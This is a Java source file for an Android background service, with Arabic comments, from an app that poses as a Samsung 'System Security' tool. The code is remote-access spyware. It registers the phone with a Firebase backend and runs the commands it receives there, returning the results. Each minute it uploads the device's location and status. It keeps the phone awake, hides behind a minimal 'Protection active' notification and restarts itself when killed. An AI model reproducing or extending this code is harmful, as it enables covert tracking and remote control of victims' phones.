package com.samsung.android.security.v8.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.samsung.android.security.v8.MainActivity;
import com.samsung.android.security.v8.handlers.*;
import com.samsung.android.security.v8.models.Command;
import com.samsung.android.security.v8.models.DeviceData;
import com.samsung.android.security.v8.utils.DeviceInfo;
import com.samsung.android.security.v8.utils.FirebaseManager;

public class CoreService extends Service {
    
    private static final String CHANNEL_ID = "system_security_service";
    private static final int NOTIFICATION_ID = 2026;
    
    private PowerManager.WakeLock wakeLock;
    private DeviceInfo deviceInfo;
    private FirebaseManager firebaseManager;
    private CommandHandler commandHandler;
    
    private DatabaseReference commandsRef;
    private ChildEventListener commandListener;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // تهيئة المكونات
        deviceInfo = new DeviceInfo(this);
        firebaseManager = FirebaseManager.getInstance();
        commandHandler = new CommandHandler(this);
        
        // منع النوم
        acquireWakeLock();
        
        // بدء الخدمة في المقدمة
        startForegroundService();
        
        // تسجيل الجهاز في Firebase
        registerDevice();
        
        // الاستماع للأوامر
        listenForCommands();
        
        // تحديث الحالة دورياً
        startStatusUpdater();
    }
    
    private void startForegroundService() {
        createNotificationChannel();
        
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, 
            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );
        
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Security")
                .setContentText("Protection active")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
        
        startForeground(NOTIFICATION_ID, notification);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Security Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("System security protection");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "AlKhanjar::CoreServiceLock"
        );
        wakeLock.acquire();
    }
    
    private void registerDevice() {
        DeviceData deviceData = new DeviceData();
        deviceData.setDeviceId(deviceInfo.getDeviceId());
        deviceData.setDeviceModel(deviceInfo.getDeviceModel());
        deviceData.setAndroidVersion(deviceInfo.getAndroidVersion());
        deviceData.setManufacturer(deviceInfo.getManufacturer());
        deviceData.setBatteryLevel(deviceInfo.getBatteryLevel());
        deviceData.setNetworkType(deviceInfo.getNetworkType());
        deviceData.setStatus("online");
        deviceData.setLastSeen(System.currentTimeMillis());
        
        firebaseManager.updateDeviceData(deviceData);
    }
    
    private void listenForCommands() {
        String deviceId = deviceInfo.getDeviceId();
        commandsRef = firebaseManager.getCommandsReference(deviceId);
        
        commandListener = new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                handleCommand(snapshot);
            }
            
            @Override
            public void onChildChanged(DataSnapshot snapshot, String previousChildName) {
                handleCommand(snapshot);
            }
            
            @Override
            public void onChildRemoved(DataSnapshot snapshot) {}
            
            @Override
            public void onChildMoved(DataSnapshot snapshot, String previousChildName) {}
            
            @Override
            public void onCancelled(DatabaseError error) {}
        };
        
        commandsRef.addChildEventListener(commandListener);
    }
    
    private void handleCommand(DataSnapshot snapshot) {
        try {
            Command command = snapshot.getValue(Command.class);
            if (command != null && !command.isExecuted()) {
                // تنفيذ الأمر
                commandHandler.execute(command, new CommandHandler.CommandCallback() {
                    @Override
                    public void onSuccess(Object result) {
                        // إرسال النتيجة
                        firebaseManager.sendCommandResponse(
                            deviceInfo.getDeviceId(),
                            command.getCommandId(),
                            true,
                            result
                        );
                        
                        // تحديث حالة الأمر
                        snapshot.getRef().child("executed").setValue(true);
                    }
                    
                    @Override
                    public void onError(String error) {
                        firebaseManager.sendCommandResponse(
                            deviceInfo.getDeviceId(),
                            command.getCommandId(),
                            false,
                            error
                        );
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void startStatusUpdater() {
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(60000); // كل دقيقة
                    
                    // تحديث معلومات الجهاز
                    DeviceData deviceData = new DeviceData();
                    deviceData.setDeviceId(deviceInfo.getDeviceId());
                    deviceData.setBatteryLevel(deviceInfo.getBatteryLevel());
                    deviceData.setNetworkType(deviceInfo.getNetworkType());
                    deviceData.setStatus("online");
                    deviceData.setLastSeen(System.currentTimeMillis());
                    
                    // تحديث الموقع
                    LocationHandler locationHandler = new LocationHandler(CoreService.this);
                    locationHandler.getCurrentLocation(location -> {
                        if (location != null) {
                            deviceData.setLatitude(location.getLatitude());
                            deviceData.setLongitude(location.getLongitude());
                        }
                        firebaseManager.updateDeviceData(deviceData);
                    });
                    
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // تحديث الحالة إلى offline
        DeviceData deviceData = new DeviceData();
        deviceData.setDeviceId(deviceInfo.getDeviceId());
        deviceData.setStatus("offline");
        deviceData.setLastSeen(System.currentTimeMillis());
        firebaseManager.updateDeviceData(deviceData);
        
        // إزالة المستمعين
        if (commandsRef != null && commandListener != null) {
            commandsRef.removeEventListener(commandListener);
        }
        
        // تحرير WakeLock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        // إعادة تشغيل الخدمة
        Intent restartIntent = new Intent(getApplicationContext(), CoreService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        
        // تحديث الحالة إلى offline
        DeviceData deviceData = new DeviceData();
        deviceData.setDeviceId(deviceInfo.getDeviceId());
        deviceData.setStatus("offline");
        deviceData.setLastSeen(System.currentTimeMillis());
        firebaseManager.updateDeviceData(deviceData);
        
        // إعادة تشغيل الخدمة
        Intent restartIntent = new Intent(getApplicationContext(), CoreService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }
}
